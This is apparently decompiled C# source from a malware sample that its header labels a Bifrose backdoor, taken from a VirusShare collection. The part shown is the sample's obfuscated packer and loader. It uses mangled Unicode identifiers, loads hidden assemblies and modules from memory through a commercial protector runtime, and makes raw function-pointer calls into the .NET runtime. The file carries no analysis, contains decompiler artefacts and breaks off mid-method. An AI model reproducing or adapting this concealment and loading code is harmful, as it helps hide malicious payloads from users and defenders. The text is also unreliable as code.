// Decompiled with JetBrains decompiler
// Type: û.ú
// Assembly: WindowsApplication1, Version=8.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: ED46BCEB-CED4-40B1-868F-E45B7BFC7B90
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.fvwi-3506d7db83d7c6cd72c6f5d63254a0996ba02ed9c2d6fff1665079f5cad371a2.exe

using \u0083Ó;
using \u0083Þ;
using \u0083û;
using PvLogiciels.dotNetProtector;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Threading;

namespace \u0083û
{
  internal class \u0083ú
  {
    internal static int \u0081\u00A2;
    internal static \u0082\u009E \u0081\u008F;
    internal static \u0082\u009E \u0081\u0085;
    internal static \u0082Ã û;
    [FixedAddressValueType]
    internal static int ö;
    internal static __FnPtr<void ()> ê;
    internal static \u0082Ã Ñ;
    [FixedAddressValueType]
    internal static \u0082\u00AE.\u0082\u0083 Ê;
    internal static __FnPtr<void ()> \u00B8;
    [FixedAddressValueType]
    internal static bool \u009C;
    internal static __FnPtr<void ()> \u008E;
    internal static \u0082Ã \u0083ò;
    [FixedAddressValueType]
    internal static \u0082\u00AE.\u0082\u0083 \u0082õ;
    internal static __FnPtr<void ()> \u0082\u00D7;
    [FixedAddressValueType]
    internal static int \u0083\u00BF;
    internal static __FnPtr<void ()> \u0083\u00AB;
    internal static \u0082Ã \u0083\u008F;
    [FixedAddressValueType]
    internal static \u0082\u00AE.\u0082\u0083 \u0083\u0088;
    internal static __FnPtr<void ()> \u0082ì;
    internal static \u0082\u009E \u0082Ê;
    internal static \u0082Ã \u0082\u00BF;
    [FixedAddressValueType]
    internal static \u0082\u00AE.\u0082\u0083 \u0082µ;
    internal static __FnPtr<void ()> \u0082\u0097;
    internal static bool \u0082\u0080;
    internal static bool \u0081ñ;
    internal static bool ñ;
    internal static int \u0081Ñ;
    internal static uint \u0081Å;
    internal static uint \u0083Ô;
    internal static \u0081î.\u0082\u0083 \u0081\u00A4;
    internal static uint \u0081\u0093;
    internal static uint \u0081\u0087;
    internal static uint ø;
    internal static \u0081î.\u0082\u0083 î;
    internal static bool Ü;
    internal static \u0082Ã \u0083Ñ;
    internal static \u0082\u009E Á;
    public static unsafe int** \u00BB;
    public static unsafe int** \u00A6;
    internal static __FnPtr<int ()> \u0092;
    internal static int \u008C;
    [FixedAddressValueType]
    internal static uint \u0084;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* \u0083ù;
    internal static uint é;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* \u0083é;
    internal static unsafe __FnPtr<void ()>* \u0083ã;
    internal static unsafe __FnPtr<void ()>* \u0083ß;
    [FixedAddressValueType]
    internal static unsafe void* \u0083Ø;
    [FixedAddressValueType]
    internal static int \u0083È;
    internal static int \u0083\u00BC;
    internal static int \u0083\u00B7;
    internal static int \u0083\u00B0;
    internal static int \u0082\u0091;
    internal static \u0082\u00A8 \u0083ª;
    internal static volatile uint \u0083\u00A7;
    internal static \u0082\u00A8 \u0083\u00A0;
    internal static \u0082\u009A \u0083\u009E;
    internal static volatile \u0082\u0094 \u0083\u009D;
    internal static \u0082\u009A \u0081\u0024;
    internal static volatile unsafe void* \u0083\u0093;
    internal static volatile uint \u0083\u008C;
    internal static unsafe __FnPtr<void ()>* \u0083\u0086;
    internal static unsafe __FnPtr<void ()>* \u0083\u0082;
    internal static int \u0082\u0024;

    internal static unsafe Assembly ò(string _param0)
    {
      string str = _param0.Replace("\\", "");
      if (!str.StartsWith("PvLogiciels.dotNetProtector.Runtime"))
        return (Assembly) null;
      int length = str.IndexOf(',');
      if (length >= 0)
        str = str.Substring(0, length).Trim();
      bool flag = str == "PvLogiciels.dotNetProtector.Runtime";
      byte[] numArray = !flag ? new byte[\u0083ú.\u008D()] : new byte[\u0083ú.\u0089()];
      if (numArray == null || numArray.Length == 0)
        return (Assembly) null;
      GCHandle gcHandle = GCHandle.Alloc((object) numArray, GCHandleType.Pinned);
      byte* pointer = (byte*) Marshal.UnsafeAddrOfPinnedArrayElement((Array) numArray, 0).ToPointer();
      if (flag)
        \u0083ú.\u0091(pointer);
      else
        \u0083ú.\u0095(pointer);
      gcHandle.Free();
      return Assembly.Load(numArray);
    }

    internal static unsafe void* \u00B9(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      Module module = Assembly.GetExecutingAssembly().LoadModule("embedded.netmodule", numArray);
      AppDomain.CurrentDomain.SetData("PvLogiciels.dotNetProtector.embedded.netmodule", (object) module);
      return Marshal.GetHINSTANCE(module).ToPointer();
    }

    internal static unsafe void* \u00B3(byte* _param0, int _param1)
    {
      byte[] numArray = new byte[_param1];
      Marshal.Copy((IntPtr) (void*) _param0, numArray, 0, _param1);
      return Marshal.GetHINSTANCE(Assembly.Load(numArray).GetLoadedModules()[0]).ToPointer();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int â(string[] _param0) => \u003CdotNetProtector\u003E.Main(_param0) == 0 ? Environment.ExitCode : 0;

    internal static int ß(string[] _param0)
    {
      Environment.ExitCode = 0;
      Module data = (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");
      if (data == (Module) null)
        return \u0083ú.â(_param0);
      Type type = data.GetType("<dotNetProtector>");
      if (type == (Type) null)
        return \u0083ú.â(_param0);
      MethodInfo method = type.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
      if (method == (MethodInfo) null)
        return \u0083ú.â(_param0);
      object[] parameters = new object[1]
      {
        (object) _param0
      };
      object obj = method.Invoke((object) null, parameters);
      int num1 = obj != null ? (int) obj : 0;
      int num2 = num1;
      return num1 != 0 ? num2 : Environment.ExitCode;
    }

    internal static Assembly Þ(object _param0, ResolveEventArgs _param1)
    {
      string str = _param1.Name.Replace("\\", "");
      if (!str.StartsWith("PvLogiciels.dotNetProtector.Runtime"))
        return (Assembly) null;
      Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
      int index = 0;
      if (0 < assemblies.Length)
      {
        Assembly assembly;
        do
        {
          assembly = assemblies[index];
          if (!(assembly.FullName == str))
            ++index;
          else
            goto label_5;
        }
        while (index < assemblies.Length);
        goto label_6;
label_5:
        return assembly;
      }
label_6:
      return (Assembly) null;
    }

    internal static Module Ù(object _param0, ResolveEventArgs _param1) => (Module) AppDomain.CurrentDomain.GetData("PvLogiciels.dotNetProtector.embedded.netmodule");

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int Õ(string[] _param0)
    {
      PvLogiciels.dotNetProtector.Runtime.ExeInit(typeof (RuntimeInterop), IntPtr.Zero, 0);
      Assembly.GetExecutingAssembly().ModuleResolve += new ModuleResolveEventHandler(\u0083ú.Ù);
      return \u0083ú.ß(_param0);
    }

    [STAThread]
    internal static int Ò(string[] _param0)
    {
      \u0083ú.\u0083º();
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0083ú.Þ);
      return \u0083ú.Õ(_param0);
    }

    internal static void Ï()
    {
    }

    internal static int Ì() => 0;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool Å() => \u0083ú.\u0083\u008C != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0087() => \u0083ú.\u0083\u008C == 1U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u00B2() => \u0083ú.\u0083\u008C == 0U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u00A0() => \u0083ú.\u0083\u00A7 != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0083Ù() => (\u0083ú.\u0083\u008C != uint.MaxValue ? 1 : 0) == 0 || (\u0083ú.\u0083\u00A7 != uint.MaxValue ? 1 : 0) != 0 || \u0083ú.\u0083\u008C != 1U && \u0083ú.\u0083\u008C != 0U;

    internal static void \u0083É(Exception _param0, Exception _param1) => throw new \u0083Ç("A nested exception occurred after the primary exception that caused the C++ module to fail to load.\n", _param0, _param1);

    internal static void \u0083ï(string _param0) => throw new \u0083Ì(_param0);

    internal static void \u0083ï(string _param0, Exception _param1) => throw new \u0083Ì(_param0, _param1);

    internal static void \u0083á(EventHandler _param0) => \u0083À.\u0083ó.\u0083(_param0);

    [SecuritySafeCritical]
    internal static unsafe Guid \u0083Ï(\u0082é* _param0) => new Guid((uint) *(int*) _param0, *(ushort*) ((IntPtr) _param0 + 4), *(ushort*) ((IntPtr) _param0 + 6), *(byte*) ((IntPtr) _param0 + 8), *(byte*) ((IntPtr) _param0 + 9), *(byte*) ((IntPtr) _param0 + 10), *(byte*) ((IntPtr) _param0 + 11), *(byte*) ((IntPtr) _param0 + 12), *(byte*) ((IntPtr) _param0 + 13), *(byte*) ((IntPtr) _param0 + 14), *(byte*) ((IntPtr) _param0 + 15));

    [SecurityCritical]
    internal static unsafe int \u0083Ä(\u0082á** _param0)
    {
      \u0081ò* òPtr1 = (\u0081ò*) 0;
      int num1;
      try
      {
        Guid riid = \u0083ú.\u0083Ï((\u0082é*) &\u0083ú.\u0081\u0085);
        òPtr1 = (\u0081ò*) RuntimeEnvironment.GetRuntimeInterfaceAsIntPtr(\u0083ú.\u0083Ï((\u0082é*) &\u0083ú.\u0082Ê), riid).ToPointer();
        goto label_4;
      }
      catch (Exception ex)
      {
        num1 = Marshal.GetHRForException(ex);
      }
      if (num1 < 0)
        goto label_5;
label_4:
      \u0081ò* òPtr2 = òPtr1;
      \u0082á** áPtr = _param0;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      num1 = __calli((__FnPtr<int (IntPtr, \u0082á**)>) *(int*) (*(int*) òPtr1 + 52))((\u0082á**) òPtr2, (IntPtr) áPtr);
      \u0081ò* òPtr3 = òPtr1;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      int num2 = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) òPtr3 + 8))((IntPtr) òPtr3);
label_5:
      return num1;
    }

    internal static unsafe void \u0082\u009C(\u0082á* _param0)
    {
      \u0082á* áPtr = _param0;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      int num = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) áPtr + 8))((IntPtr) áPtr);
    }

    [SecurityCritical]
    internal static unsafe AppDomain \u0083\u00B9()
    {
      \u0082á* áPtr1 = (\u0082á*) 0;
      int errorCode = \u0083ú.\u0083Ä(&áPtr1);
      if (errorCode >= 0)
      {
        try
        {
          return (AppDomain) Marshal.GetObjectForIUnknown(new IntPtr((void*) áPtr1));
        }
        finally
        {
          \u0082á* áPtr2 = áPtr1;
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          int num = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) áPtr2 + 8))((IntPtr) áPtr2);
        }
      }
      else
      {
        Marshal.ThrowExceptionForHR(errorCode);
        return (AppDomain) null;
      }
    }

    [SecurityCritical]
    internal static unsafe void \u0083\u00A8(__FnPtr<int (void*)> _param0, void* _param1)
    {
      Guid riid = \u0083ú.\u0083Ï((\u0082é*) &\u0083ú.Á);
      \u0081ë* pointer = (\u0081ë*) RuntimeEnvironment.GetRuntimeInterfaceAsIntPtr(\u0083ú.\u0083Ï((\u0082é*) &\u0083ú.\u0081\u008F), riid).ToPointer();
      try
      {
        AppDomain appDomain = \u0083ú.\u0083\u00B9();
        // ISSUE: cast to a function pointer type
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        int errorCode = __calli((__FnPtr<int (IntPtr, uint, __FnPtr<int (void*)>, void*)>) *(int*) (*(int*) pointer + 32))((void*) pointer, (__FnPtr<int (void*)>) appDomain.Id, (uint) _param0, (IntPtr) _param1);
        if (errorCode >= 0)
          return;
        Marshal.ThrowExceptionForHR(errorCode);
      }
      finally
      {
        \u0081ë* ëPtr = pointer;
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        int num = (int) __calli((__FnPtr<uint (IntPtr)>) *(int*) (*(int*) ëPtr + 8))((IntPtr) ëPtr);
      }
    }

    [SecuritySafeCritical]
    internal static unsafe int \u0083\u0094(void* _param0)
    {
      GC.KeepAlive((object) int.MaxValue);
      return 0;
    }

    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0083\u0085()
    {
      if (\u0083ú.î != (\u0081î.\u0082\u0083) 2)
        return \u0083ú.î == (\u0081î.\u0082\u0083) -1;
      void** voidPtr = (void**) &\u0083ú.\u0083Ñ;
      if (ref \u0083ú.\u0083Ñ < ref \u0083ú.û)
      {
        while (*(int*) voidPtr == 0)
        {
          voidPtr += 4;
          if ((IntPtr) voidPtr >= ref \u0083ú.û)
            goto label_5;
        }
        \u0083ú.î = (\u0081î.\u0082\u0083) -1;
        return true;
      }
label_5:
      \u0083ú.î = (\u0081î.\u0082\u0083) 0;
      return false;
    }

    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0082\u009D()
    {
      if (\u0083ú.\u0081\u00A4 != (\u0081î.\u0082\u0083) 2)
        return \u0083ú.\u0081\u00A4 == (\u0081î.\u0082\u0083) -1;
      void** voidPtr1 = (void**) &\u0083ú.\u0083\u009E;
      if (ref \u0083ú.\u0083\u009E < ref \u0083ú.\u0081\u0024)
      {
        while (*(int*) voidPtr1 == 0)
        {
          voidPtr1 += 4;
          if ((IntPtr) voidPtr1 >= ref \u0083ú.\u0081\u0024)
            goto label_5;
        }
        \u0083ú.\u0081\u00A4 = (\u0081î.\u0082\u0083) -1;
        return true;
      }
label_5:
      void** voidPtr2 = (void**) &\u0083ú.\u0083\u00A0;
      if (ref \u0083ú.\u0083\u00A0 < ref \u0083ú.\u0083ª)
      {
        while (*(int*) voidPtr2 == 0)
        {
          voidPtr2 += 4;
          if ((IntPtr) voidPtr2 >= ref \u0083ú.\u0083ª)
            goto label_9;
        }
        \u0083ú.\u0081\u00A4 = (\u0081î.\u0082\u0083) -1;
        return true;
      }
label_9:
      \u0083ú.\u0081\u00A4 = (\u0081î.\u0082\u0083) 0;
      return false;
    }

    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0082\u0090() => \u0083ú.\u0083\u0085() && !\u0083ú.\u0082\u0080 || \u0083ú.\u0082\u009D() && !\u0083ú.ñ && \u0083ú.\u0083\u009D == (\u0082\u0094) 0;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0082Î() => \u0083ú.\u0081ñ;

    [SecurityCritical]
    internal static unsafe void \u0082\u00BB() => \u0083ú.\u0083\u00A8((__FnPtr<int (void*)>) (IntPtr) \u0083ú.\u00BB, (void*) 0);

    internal static void \u0082\u00A7() => \u0083ú.\u0083\u00BF = 0;

    internal static void \u0081Ï() => \u0083ú.ö = 0;

    internal static void \u0081ú() => \u0083ú.\u009C = false;

    internal static void \u0081æ() => \u0083ú.\u0083\u0088 = (\u0082\u00AE.\u0082\u0083) 0;

    internal static void \u0081Ê() => \u0083ú.\u0082õ = (\u0082\u00AE.\u0082\u0083) 0;

    internal static void \u0081ª() => \u0083ú.\u0082µ = (\u0082\u00AE.\u0082\u0083) 0;

    internal static void \u0081\u008E() => \u0083ú.Ê = (\u0082\u00AE.\u0082\u0083) 0;

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0083æ([In] \u0082Û* obj0)
    {
      \u0083ú.\u0082ï((\u0082Õ*) obj0, "The C++ module failed to load during vtable initialization.\n");
      \u0083ú.\u0083\u0088 = (\u0082\u00AE.\u0082\u0083) 1;
      \u0083ú.É((__FnPtr<void* ()>*) &\u0083ú.Ñ, (__FnPtr<void* ()>*) &\u0083ú.\u0082\u00BF);
      \u0083ú.\u0083\u0088 = (\u0082\u00AE.\u0082\u0083) 2;
    }

    [SecurityCritical]
    internal static unsafe void è([In] \u0082Û* obj0)
    {
      \u0083ú.\u0082ï((\u0082Õ*) obj0, "The C++ module failed to load while attempting to initialize the default appdomain.\n");
      \u0083ú.\u0082\u00BB();
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u00D7([In] \u0082Û* obj0)
    {
      \u0083ú.\u0082ï((\u0082Õ*) obj0, "The C++ module failed to load during native initialization.\n");
      \u0083ú.\u0081á();
      \u0083ú.ñ = true;
      if (!\u0083ú.\u0083Ù())
        \u0083ú.\u0024(33);
      switch (\u0083ú.\u0083\u009D)
      {
        case (\u0082\u0094) 0:
          \u0083ú.\u0082õ = (\u0082\u00AE.\u0082\u0083) 1;
          \u0083ú.\u0083\u009D = (\u0082\u0094) 1;
          if (\u0083ú.à((__FnPtr<int ()>*) &\u0083ú.\u0083\u009E, (__FnPtr<int ()>*) &\u0083ú.\u0081\u0024) != 0)
            throw new \u0083Ì(\u0083ú.\u0082ä((\u0082Õ*) obj0));
          \u0083ú.Ú((__FnPtr<void ()>*) &\u0083ú.\u0083\u00A0, (__FnPtr<void ()>*) &\u0083ú.\u0083ª);
          \u0083ú.\u0083\u009D = (\u0082\u0094) 2;
          \u0083ú.Ü = true;
          \u0083ú.\u0082õ = (\u0082\u00AE.\u0082\u0083) 2;
          break;
        case (\u0082\u0094) 1:
          \u0083ú.\u0024(33);
          break;
      }
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void Ä([In] \u0082Û* obj0)
    {
      \u0083ú.\u0082ï((\u0082Õ*) obj0, "The C++ module failed to load during process initialization.\n");
      \u0083ú.\u0082µ = (\u0082\u00AE.\u0082\u0083) 1;
      \u0083ú.\u0081\u0086();
      \u0083ú.É((__FnPtr<void* ()>*) &\u0083ú.\u0083Ñ, (__FnPtr<void* ()>*) &\u0083ú.û);
      \u0083ú.\u0082µ = (\u0082\u00AE.\u0082\u0083) 2;
      \u0083ú.\u0082\u0080 = true;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void º([In] \u0082Û* obj0)
    {
      \u0083ú.\u0082ï((\u0082Õ*) obj0, "The C++ module failed to load during appdomain initialization.\n");
      \u0083ú.Ê = (\u0082\u00AE.\u0082\u0083) 1;
      \u0083ú.\u00AB();
      \u0083ú.É((__FnPtr<void* ()>*) &\u0083ú.\u0083ò, (__FnPtr<void* ()>*) &\u0083ú.\u0083\u008F);
      \u0083ú.Ê = (\u0082\u00AE.\u0082\u0083) 2;
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0083Ü([In] \u0082Û* obj0)
    {
      \u0083ú.\u0082ï((\u0082Õ*) obj0, "The C++ module failed to load during registration for the unload events.\n");
      EventHandler eventHandler = new EventHandler(\u0083ú.\u0082ý);
      \u0083À.\u0083ó.\u0083(eventHandler);
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0097([In] \u0082Û* obj0)
    {
      \u0083ú.\u009C = AppDomain.CurrentDomain.IsDefaultAppDomain();
      if (\u0083ú.\u009C)
        \u0083ú.\u0081ñ = true;
      void* voidPtr1 = \u0083ú.\u0081ç();
      int num1 = 0;
      int num2 = 0;
      int num3 = 0;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        while (num2 == 0)
        {
          try
          {
          }
          finally
          {
            IntPtr comparand = (IntPtr) 0;
            IntPtr num4 = (IntPtr) voidPtr1;
            // ISSUE: cast to a reference type
            void* voidPtr2 = (void*) Interlocked.CompareExchange((IntPtr&) ref \u0083ú.\u0083\u0093, num4, comparand);
            if ((IntPtr) voidPtr2 == IntPtr.Zero)
              num2 = 1;
            else if (voidPtr2 == voidPtr1)
            {
              num1 = 1;
              num2 = 1;
            }
          }
          if (num2 == 0)
            \u0083ú.\u0081Ú(1000U);
        }
        \u0083ú.\u0083æ(obj0);
        if (\u0083ú.\u009C)
        {
          \u0083ú.\u00D7(obj0);
          \u0083ú.Ä(obj0);
        }
        else if (\u0083ú.\u0082\u0090())
          num3 = 1;
      }
      finally
      {
        if (num1 == 0)
        {
          IntPtr num5 = (IntPtr) 0;
          // ISSUE: cast to a reference type
          Interlocked.Exchange((IntPtr&) ref \u0083ú.\u0083\u0093, num5);
        }
      }
      if (num3 != 0)
        \u0083ú.è(obj0);
      \u0083ú.º(obj0);
      \u0083ú.\u0083\u00BF = 1;
      \u0083ú.\u0083Ü(obj0);
    }

    [SecurityCritical]
    internal static void \u008B() => \u0083ú.\u00A3();

    [SecurityCritical]
    internal static unsafe int \u0083ø(void* _param0)
    {
      \u0083ú.\u0081\u008A();
      \u0083ú.\u0082\u0080 = false;
      if (\u0083ú.Ü)
      {
        \u0083ú.\u0083\u00B1();
        \u0083ú.\u0083\u009D = (\u0082\u0094) 0;
        \u0083ú.Ü = false;
      }
      \u0083ú.ñ = false;
      return 0;
    }

    [SecurityCritical]
    internal static unsafe void \u0083ä()
    {
      if (!\u0083ú.\u0081ñ)
        return;
      if (AppDomain.CurrentDomain.IsDefaultAppDomain())
      {
        \u0083ú.\u0083ø((void*) 0);
      }
      else
      {
        // ISSUE: cast to a function pointer type
        \u0083ú.\u0083\u00A8((__FnPtr<int (void*)>) (IntPtr) \u0083ú.\u00A6, (void*) 0);
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [PrePrepareMethod]
    [SecurityCritical]
    internal static void \u0082ý(object _param0, EventArgs _param1)
    {
      if (\u0083ú.\u0083\u00BF == 0 || Interlocked.Exchange(ref \u0083ú.ö, 1) != 0)
        return;
      int num = Interlocked.Decrement(ref \u0083ú.\u0081Ñ) == 0 ? 1 : 0;
      \u0083ú.\u00A3();
      if ((byte) num == (byte) 0)
        return;
      \u0083ú.\u0083ä();
    }

    [DebuggerStepThrough]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    internal static unsafe void \u0082ã([In] \u0082Û* obj0, Exception _param1)
    {
      try
      {
        bool flag = Interlocked.Decrement(ref \u0083ú.\u0081Ñ) == 0;
        \u0083ú.\u008B();
        if (!flag)
          return;
        \u0083ú.\u0083ä();
      }
      catch (Exception ex)
      {
        \u0083ú.\u0083É(_param1, ex);
      }
      catch
      {
        \u0083ú.\u0083É(_param1, (Exception) null);
      }
    }

    [SecurityCritical]
    internal static unsafe \u0082Û* \u0083\u00B3([In] \u0082Û* obj0)
    {
      \u0083ú.\u0083\u0083((\u0082Õ*) obj0);
      return obj0;
    }

    [SecurityCritical]
    internal static unsafe void \u0083\u00A4([In] \u0082Û* obj0) => \u0083ú.\u0082ù((\u0082Õ*) obj0);

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0081à([In] \u0082Û* obj0)
    {
      bool flag = false;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        \u0083ú.\u0082ï((\u0082Õ*) obj0, "The C++ module failed to load.\n");
        RuntimeHelpers.PrepareConstrainedRegions();
        try
        {
        }
        finally
        {
          Interlocked.Increment(ref \u0083ú.\u0081Ñ);
          flag = true;
        }
        \u0083ú.\u0097(obj0);
      }
      catch (Exception ex)
      {
        if (flag)
          \u0083ú.\u0082ã(obj0, ex);
        throw new \u0083Ì(\u0083ú.\u0082ä((\u0082Õ*) obj0), ex);
      }
      catch
      {
        if (flag)
          \u0083ú.\u0082ã(obj0, (Exception) null);
        throw new \u0083Ì(\u0083ú.\u0082ä((\u0082Õ*) obj0), (Exception) null);
      }
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    static unsafe \u0083ú()
    {
      \u0082Û û;
      \u0083ú.\u0083\u00B3(&û);
      // ISSUE: fault handler
      try
      {
        \u0083ú.\u0081à(&û);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u0083ú.µ((__FnPtr<void (void*)>) __methodptr(\u0083\u00A4), (void*) &û);
      }
      \u0083ú.\u0082ù((\u0082Õ*) &û);
    }

    [SecuritySafeCritical]
    [DebuggerStepThrough]
    internal static unsafe \u0082Õ* \u0083\u0083([In] \u0082Õ* obj0)
    {
      IntPtr num = (IntPtr) GCHandle.Alloc((object) null);
      *(int*) obj0 = (int) num.ToPointer();
      return obj0;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0082ù([In] \u0082Õ* obj0)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Free();
      *(int*) obj0 = 0;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe \u0082Õ* \u0082ï([In] \u0082Õ* obj0, string _param1)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target = (object) _param1;
      return obj0;
    }

    [SecuritySafeCritical]
    internal static unsafe string \u0082ä([In] \u0082Õ* obj0) => (string) ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target;

    [HandleProcessCorruptedStateExceptions]
    [STAThread]
    internal static unsafe int \u0082Ô(string[] _param0)
    {
      if (\u0083ú.\u008C == 0)
        \u0083ú.\u0081Ë((void*) 0, (\u0082\u0081) 1, (void*) 0, 0U);
      try
      {
        \u0083ú.\u0098();
        \u0081\u00B8 obj;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref obj = \u0083ú.\u0081\u00B7();
        int num;
        char** chPtr1;
        char** chPtr2;
        if (\u0083ú.Ô(&num, &chPtr1, &chPtr2, \u0083ú.\u0083\u00BC, &obj) < 0)
          \u0083ú.\u0024(8);
        return \u0083ú.Ò(_param0);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00BE((uint) Marshal.GetExceptionCode(), (\u0081\u00BD*) Marshal.GetExceptionPointers()) != 0)
      {
        return Marshal.GetExceptionCode();
      }
    }

    internal static unsafe void \u0082Í()
    {
      ù* ùPtr = (ù*) \u0083ú.\u0081\u00AD((char*) 0);
      if (*(ushort*) ùPtr != (ushort) 23117)
        return;
      \u0081\u0099* objPtr = (\u0081\u0099*) (*(int*) ((IntPtr) ùPtr + 60) + (IntPtr) ùPtr);
      if (*(int*) objPtr != 17744 || *(ushort*) ((IntPtr) objPtr + 24) != (ushort) 267)
        return;
      if (*(ushort*) ((IntPtr) objPtr + 24 + 68) != (ushort) 3)
        \u0083ú.\u0081Î(2);
      else
        \u0083ú.\u0081Î(1);
    }

    [SecurityCritical]
    internal static unsafe void \u0082Â()
    {
      \u0083ú.\u0082Í();
      *\u0083ú.\u0081\u00BB() = \u0083ú.\u0082\u0091;
      *\u0083ú.\u0081À() = \u0083ú.\u0083\u00B0;
      if (\u0083ú.\u0083\u00B7 != -1)
        return;
      \u0083ú.\u0081Ç(-1);
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe ValueType \u0082º() => (IntPtr) \u0083ú.\u0083Ø != IntPtr.Zero ? (ValueType) GCHandle.FromIntPtr(new IntPtr(\u0083ú.\u0083Ø)) : (ValueType) null;

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0081Ø(object _param0)
    {
      \u0083ú.\u0083Ø = (void*) 0;
      \u0083ú.\u0082\u0096(_param0);
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0082\u0096(object _param0)
    {
      ValueType valueType = \u0083ú.\u0082º();
      if (valueType == null)
        \u0083ú.\u0083Ø = GCHandle.ToIntPtr(GCHandle.Alloc(_param0)).ToPointer();
      else
        ((GCHandle) valueType).Target = _param0;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static object \u0082\u008A()
    {
      ValueType valueType = \u0083ú.\u0082º();
      return valueType != null ? ((GCHandle) valueType).Target : (object) null;
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe void \u0081\u00AC()
    {
      ValueType valueType = \u0083ú.\u0082º();
      if (valueType == null)
        return;
      ((GCHandle) valueType).Free();
      \u0083ú.\u0083Ø = (void*) 0;
    }

    [DebuggerStepThrough]
    [SecuritySafeCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081ö() => \u0083ú.\u0082\u008A() != null;

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void \u0081é()
    {
      if (!\u0083ú.\u0081ö())
      {
        \u0083ú.\u0083Ø = (void*) 0;
        \u0083ú.\u0082\u0096(new object());
        \u0083ú.\u0083È = 0;
      }
      ++\u0083ú.\u0083È;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081Ý()
    {
      --\u0083ú.\u0083È;
      if (\u0083ú.\u0083È != 0)
        return;
      \u0083ú.\u0081\u00AC();
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081Ð() => Monitor.Enter(\u0083ú.\u0082\u008A());

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081Æ() => Monitor.Exit(\u0083ú.\u0082\u008A());

    [SecurityCritical]
    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool ë()
    {
      bool flag = false;
      if (\u0083ú.\u0081ö())
      {
        Monitor.Enter(\u0083ú.\u0082\u008A());
        flag = true;
      }
      return flag;
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081\u00B2()
    {
      bool flag = false;
      if (\u0083ú.\u0081ö())
      {
        Monitor.Exit(\u0083ú.\u0082\u008A());
        flag = true;
      }
      return flag;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081\u00A9()
    {
